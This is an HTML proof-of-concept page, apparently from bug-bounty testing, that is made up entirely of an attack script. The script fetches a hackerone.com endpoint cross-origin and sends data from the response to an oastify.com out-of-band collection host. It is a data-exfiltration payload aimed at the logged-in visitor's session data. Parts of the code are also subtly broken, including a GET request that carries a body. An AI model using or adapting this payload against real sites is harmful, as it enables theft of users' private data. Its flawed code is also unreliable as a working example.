<html>
  <body>
    <form id="myForm" method="GET" action="https://hackerone.com/stories-of-2024/new">
      <input type="submit" value="Submit request" />
    </form>

    <script>
      // Intercept the form submission to capture the response
      document.getElementById("myForm").onsubmit = function(event) {
        //event.preventDefault();  // Prevent the form from submitting the usual way

        // Create FormData object to capture the form data
        const formData = new FormData(document.getElementById("myForm"));

        // First fetch request
        fetch("https://hackerone.com/stories-of-2024/new", {
          method: "GET",
          body: formData,
        })
        .then((response) => {
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }
          return response.json();  // Parse the first response as JSON
        })
        .then((data) => {
          console.log("First fetch response:", data);

          // Use the data from the first request to perform the second request
          // (Assume the first response has some property `someValue` you want to send)
          const secondRequestData = { valueFromFirstRequest: data.someValue };

          // Second fetch request, nested inside the first one
          return fetch("https://nypyiisl4k8l4hw8iq71b426exko8hw6.oastify.com", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(secondRequestData),
          });
        })
        .then((secondResponse) => {
          if (!secondResponse.ok) {
            throw new Error("Second request failed");
          }
          return secondResponse.json();  // Parse the second response as JSON
        })
        .then((secondData) => {
          console.log("Second fetch response:", secondData);
          // Handle the second response data here
        })
        .catch((error) => {
          console.error("Error in fetch chain:", error);
        });
      };
    </script>
  </body>
</html>
